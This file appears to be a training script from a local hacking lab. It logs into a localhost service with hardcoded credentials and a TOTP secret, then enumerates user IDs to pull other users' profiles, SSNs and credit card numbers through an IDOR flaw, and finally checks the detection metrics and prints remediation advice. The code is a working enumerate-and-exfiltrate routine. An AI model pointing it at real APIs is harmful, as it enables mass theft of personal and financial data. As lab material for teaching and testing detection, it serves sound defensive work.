#!/usr/bin/env python3
"""
IDOR (Insecure Direct Object Reference) Attack
===============================================

VULNERABILITY: /profile/{user_id} endpoint doesn't validate if authenticated user
                has permission to access the requested user_id

IMPACT: Any authenticated user can access ANY other user's profile including sensitive data

This script demonstrates:
1. Login as a regular user
2. Enumerate and access ALL user profiles (not just own profile)
3. Exfiltrate sensitive data (SSN, credit cards, emails, phone numbers)
4. Detection through IDOR metrics

OWASP: A01:2021 - Broken Access Control

Author: DevSecOps Hacking Lab
"""

import requests
import json
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
import sys
import pyotp


class IDORAttack:
    """Demonstrates IDOR vulnerability exploitation"""
    
    def __init__(
        self,
        gateway_url: str = "http://localhost:8080",
        username: str = "admin",
        password: str = "admin123",
        mfa_secret: str = "DEVSECOPSTWENTYFOURHACKINGLAB"
    ):
        self.gateway_url = gateway_url
        self.username = username
        self.password = password
        self.mfa_secret = mfa_secret
        self.access_token = None
        self.results = {
            "attack_name": "IDOR (Insecure Direct Object Reference)",
            "timestamp": datetime.now().isoformat(),
            "authenticated_as": username,
            "profiles_accessed": [],
            "success_count": 0,
            "failed_count": 0,
            "sensitive_data_stolen": []
        }
    
    def banner(self):
        """Print attack banner"""
        print("\n" + "="*70)
        print("üé≠ IDOR EXPLOITATION ATTACK")
        print("="*70)
        print(f"Target: {self.gateway_url}")
        print(f"Attacking as user: {self.username}")
        print("Vulnerability: Missing authorization check in /profile/{{user_id}}")
        print("="*70 + "\n")
    
    def authenticate(self) -> bool:
        """
        Step 1: Login and obtain JWT token
        """
        print("[*] Step 1: Authenticating...")
        
        try:
            # Login
            login_response = requests.post(
                f"{self.gateway_url}/auth/login",
                json={"username": self.username, "password": self.password},
                timeout=5
            )
            
            if login_response.status_code != 200:
                print(f"    [‚úó] Login failed: {login_response.status_code}")
                return False
            
            login_data = login_response.json()
            challenge_id = login_data.get("challenge_id")
            print(f"    [‚úì] Login successful, challenge_id: {challenge_id}")
            
            # Generate MFA code
            totp = pyotp.TOTP(self.mfa_secret, interval=30)
            mfa_code = totp.now()
            print(f"    [>] Generated MFA code: {mfa_code}")
            
            # Verify MFA
            mfa_response = requests.post(
                f"{self.gateway_url}/auth/mfa/verify",
                json={"challenge_id": challenge_id, "code": mfa_code},
                timeout=5
            )
            
            if mfa_response.status_code != 200:
                print(f"    [‚úó] MFA verification failed: {mfa_response.status_code}")
                return False
            
            mfa_data = mfa_response.json()
            self.access_token = mfa_data.get("access_token")
            print(f"    [‚úì] MFA verified, got access token")
            print(f"    [‚úì] Token (first 30 chars): {self.access_token[:30]}...")
            
            return True
            
        except Exception as e:
            print(f"    [‚úó] Authentication error: {e}")
            return False
    
    def enumerate_users(self, max_users: int = 10) -> List[int]:
        """
        Step 2: Enumerate valid user IDs
        """
        print(f"\n[*] Step 2: Enumerating user IDs (1-{max_users})...")
        
        valid_user_ids = []
        
        for user_id in range(1, max_users + 1):
            try:
                response = requests.get(
                    f"{self.gateway_url}/api/users/profile/{user_id}",
                    headers={"Authorization": f"Bearer {self.access_token}"},
                    timeout=5
                )
                
                if response.status_code == 200:
                    profile = response.json()
                    username = profile.get("username", "unknown")
                    print(f"    [‚úì] User ID {user_id} exists: {username}")
                    valid_user_ids.append(user_id)
                elif response.status_code == 404:
                    print(f"    [‚úó] User ID {user_id} not found")
                else:
                    print(f"    [?] User ID {user_id} - Status: {response.status_code}")
                    
                time.sleep(0.1)  # Small delay to avoid overwhelming
                
            except Exception as e:
                print(f"    [‚úó] Error checking user {user_id}: {e}")
        
        print(f"\n    [>] Found {len(valid_user_ids)} valid users: {valid_user_ids}")
        return valid_user_ids
    
    def exploit_idor(self, user_ids: List[int]):
        """
        Step 3: Exploit IDOR to access all user profiles
        """
        print(f"\n[*] Step 3: Exploiting IDOR vulnerability...")
        print(f"    [>] Attempting to access {len(user_ids)} user profiles")
        print(f"    [>] Current user: {self.username}\n")
        
        for user_id in user_ids:
            try:
                response = requests.get(
                    f"{self.gateway_url}/api/users/profile/{user_id}",
                    headers={"Authorization": f"Bearer {self.access_token}"},
                    timeout=5
                )
                
                if response.status_code == 200:
                    profile = response.json()
                    
                    # Check if this is IDOR (accessing someone else's profile)
                    is_idor = profile.get("username") != self.username
                    
                    if is_idor:
                        print(f"    üö® IDOR EXPLOIT SUCCESS - User ID {user_id}:")
                    else:
                        print(f"    [‚úì] Accessed own profile - User ID {user_id}:")
                    
                    print(f"        Username: {profile.get('username')}")
                    print(f"        Email: {profile.get('email')}")
                    print(f"        Role: {profile.get('role')}")
                    print(f"        SSN: {profile.get('ssn')} ‚ö†Ô∏è SENSITIVE")
                    print(f"        Credit Card: {profile.get('credit_card')} ‚ö†Ô∏è SENSITIVE")
                    print(f"        Phone: {profile.get('phone')}")
                    print(f"        Address: {profile.get('address')}")
                    print()
                    
                    # Store results
                    self.results["profiles_accessed"].append({
                        "user_id": user_id,
                        "profile": profile,
                        "is_idor": is_idor
                    })
                    
                    if is_idor:
                        self.results["sensitive_data_stolen"].append(profile)
                    
                    self.results["success_count"] += 1
                else:
                    print(f"    [‚úó] Failed to access user {user_id}: {response.status_code}")
                    self.results["failed_count"] += 1
                    
                time.sleep(0.2)
                
            except Exception as e:
                print(f"    [‚úó] Error accessing user {user_id}: {e}")
                self.results["failed_count"] += 1
    
    def demonstrate_impact(self):
        """
        Step 4: Demonstrate the impact of IDOR
        """
        print("\n[*] Step 4: Analyzing impact...")
        
        stolen_data = self.results["sensitive_data_stolen"]
        
        if not stolen_data:
            print("    [!] No IDOR exploitation occurred (only accessed own profile)")
            return
        
        print(f"\n    üö® CRITICAL: Successfully exploited IDOR vulnerability!")
        print(f"    [>] Profiles accessed: {len(self.results['profiles_accessed'])}")
        print(f"    [>] IDOR exploits (other users): {len(stolen_data)}")
        print(f"    [>] Sensitive data stolen:\n")
        
        for profile in stolen_data:
            print(f"        ‚Ä¢ {profile['username']}:")
            print(f"          - SSN: {profile['ssn']}")
            print(f"          - Credit Card: {profile['credit_card']}")
            print(f"          - Email: {profile['email']}")
            print(f"          - Phone: {profile['phone']}")
            print(f"          - Address: {profile['address']}")
            print()
    
    def check_detection(self):
        """
        Step 5: Check if IDOR was detected
        """
        print("[*] Step 5: Checking detection metrics...")
        
        try:
            response = requests.get(
                f"http://localhost:8002/metrics",  # Direct to user-service
                timeout=5
            )
            
            if response.status_code == 200:
                metrics = response.text
                
                if "user_service_idor_attempts_total" in metrics:
                    print("    [‚úì] IDOR attempts are being tracked\n")
                    
                    for line in metrics.split('\n'):
                        if 'user_service_idor_attempts_total{' in line and not line.startswith('#'):
                            print(f"        {line}")
                else:
                    print("    [!] No IDOR metrics found")
            
        except Exception as e:
            print(f"    [‚úó] Could not check metrics: {e}")
    
    def generate_report(self) -> str:
        """Generate detailed attack report"""
        print("\n" + "="*70)
        print("üìä IDOR ATTACK REPORT")
        print("="*70)
        print(f"Authenticated as: {self.username}")
        print(f"Total profiles accessed: {self.results['success_count']}")
        print(f"IDOR exploits (unauthorized): {len(self.results['sensitive_data_stolen'])}")
        print(f"Failed attempts: {self.results['failed_count']}")
        
        if self.results['sensitive_data_stolen']:
            print(f"\n‚ö†Ô∏è SENSITIVE DATA COMPROMISED:")
            print(f"   ‚Ä¢ SSNs stolen: {len(self.results['sensitive_data_stolen'])}")
            print(f"   ‚Ä¢ Credit cards exposed: {len(self.results['sensitive_data_stolen'])}")
            print(f"   ‚Ä¢ Personal info leaked: {len(self.results['sensitive_data_stolen'])} users")
        
        print("="*70)
        
        # Save report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"results/idor_attack_{timestamp}.json"
        
        try:
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n[‚úì] Report saved to: {filename}")
        except Exception as e:
            print(f"\n[‚úó] Could not save report: {e}")
        
        return filename
    
    def run(self):
        """Execute complete IDOR attack"""
        self.banner()
        
        # Step 1: Authenticate
        if not self.authenticate():
            print("\n[‚úó] Authentication failed, cannot continue")
            return False
        
        time.sleep(0.5)
        
        # Step 2: Enumerate users
        user_ids = self.enumerate_users(max_users=5)
        
        if not user_ids:
            print("\n[‚úó] No users found to exploit")
            return False
        
        time.sleep(0.5)
        
        # Step 3: Exploit IDOR
        self.exploit_idor(user_ids)
        
        # Step 4: Show impact
        self.demonstrate_impact()
        
        # Step 5: Check detection
        self.check_detection()
        
        # Generate report
        self.generate_report()
        
        # Recommendations
        print("\nüí° REMEDIATION:")
        print("   1. Add authorization check: authenticated_user == requested_user_id")
        print("   2. Implement RBAC (Role-Based Access Control)")
        print("   3. Use indirect references (UUIDs instead of sequential IDs)")
        print("   4. Log and alert on IDOR attempts")
        print("   5. Redact sensitive data in API responses")
        print()
        
        return True


def main():
    """Main entry point"""
    # You can also test as a regular user
    # attack = IDORAttack(username="user1", password="user123")  # If you had other users
    
    attack = IDORAttack()
    
    try:
        success = attack.run()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[‚úó] Attack failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()

